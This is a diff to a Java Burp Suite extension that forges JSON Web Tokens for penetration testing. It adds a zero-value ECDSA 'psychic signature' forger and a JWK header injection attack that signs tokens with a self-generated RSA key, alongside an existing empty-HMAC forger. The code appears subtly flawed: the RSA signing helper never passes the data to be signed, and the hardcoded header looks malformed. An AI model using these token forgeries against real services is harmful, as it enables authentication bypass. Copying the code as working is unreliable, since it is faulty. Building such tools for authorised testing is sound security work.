@@ -6,9 +6,11 @@ import burp.api.montoya.MontoyaApi;
 import javax.crypto.Mac;
 import javax.crypto.SecretKey;
 import javax.crypto.spec.SecretKeySpec;
+import java.math.BigInteger;
 import java.nio.charset.StandardCharsets;
-import java.security.InvalidKeyException;
-import java.security.NoSuchAlgorithmException;
+import java.security.*;
+import java.security.interfaces.RSAPrivateKey;
+import java.security.interfaces.RSAPublicKey;
 import java.util.Base64;
 import java.util.Map;
 
@@ -17,7 +19,6 @@ import org.json.*;
 public class JwtModifier {
     private final MontoyaApi api;
     private final SecretKey dummyKey = Keys.secretKeyFor(SignatureAlgorithm.HS256);
-
     JwtModifier (MontoyaApi api){
         this.api = api;
     }
@@ -29,7 +30,7 @@ public class JwtModifier {
     }
 
     private static String encodeBase64Url(String input) {
-        return Base64.getUrlEncoder().withoutPadding().encodeToString(input.getBytes());
+        return Base64.getUrlEncoder().withoutPadding().encodeToString(input.getBytes(StandardCharsets.UTF_8));
     }
 
     private static String encodeBase64UrlByte(byte[] input) {
@@ -72,6 +73,55 @@ public class JwtModifier {
         String[] jwtParts = jwt.split("\\.");
         String combined = jwtParts[0] + '.' + jwtParts[1];
         return combined + '.' + createHmacSha256EmptySignature(combined);
+    }
+
+    public String invalidEcdsa(String jwt){
+        String[] jwtParts = jwt.split("\\.");
+        String header = "ezJ0eXAiOiJKV1QiLCJhbGciOiJFUyI1NiJ9";
+        api.logging().logToOutput("ECDSA header :" + decodeBase64Url(header));
+        String claim = jwtParts[1];
+        String signature = "MAZCAQACAQA";
+        return header + '.' + claim + '.' + signature;
+    }
+
+    public String JwksInjection(String jwt){
+        String[] jwtParts = jwt.split("\\.");
+
+        try {
+            KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("RSA");
+            keyPairGenerator.initialize(2048);
+            KeyPair keyPair = keyPairGenerator.generateKeyPair();
+
+            RSAPrivateKey privateKey = (RSAPrivateKey) keyPair.getPrivate();
+            RSAPublicKey publicKey = (RSAPublicKey) keyPair.getPublic();
+
+            BigInteger modulus = publicKey.getModulus();
+            BigInteger publicExponent = publicKey.getPublicExponent();
+
+            String n = Base64.getUrlEncoder().withoutPadding().encodeToString(modulus.toByteArray());
+            String e = Base64.getUrlEncoder().withoutPadding().encodeToString(publicExponent.toByteArray());
+            JSONObject header = new JSONObject();
+            JSONObject jwk = new JSONObject();
+            jwk.put("kty", "RSA");
+            jwk.put("kid","jwt-attacker");
+            jwk.put("use", "sig");
+            jwk.put("e", e);
+            jwk.put("n",n);
+
+            header.put("typ", "JWT");
+            header.put("alg","RS256");
+            header.put("jwk",jwk);
+
+            String combined = encodeBase64Url(header.toString()) + '.' + jwtParts[1];
+            api.logging().logToOutput("combined: " + combined);
+            api.logging().logToOutput("JWK " + jwk.toString());
+            api.logging().logToOutput("return value \n" + combined + '.' + createSha256WithRsaSignature(combined, privateKey));
+            return combined + '.' + createSha256WithRsaSignature(combined, privateKey);
+        } catch (Exception e) {
+            api.logging().logToError("Error while creating RSA key pair: " + e.getMessage());
+        }
+
+        return null;
     }
 
     private String createJwtFromString(String header, String claim, String key) {
@@ -121,6 +171,19 @@ public class JwtModifier {
         } catch (Exception e) {
             api.logging().logToError(e.getMessage());
             return input;
+        }
+    }
+
+    private String createSha256WithRsaSignature(String input, RSAPrivateKey privateKey){
+        try {
+            Signature signature = Signature.getInstance("SHA256withRSA");
+            signature.initSign(privateKey);
+            byte[] signedData = signature.sign();
+            return encodeBase64UrlByte(signedData);
+
+        } catch (Exception e) {
+            api.logging().logToError("An error occured during SHA256 RSA signature calculation: " + e.getMessage());
+            return null;
         }
     }
 }
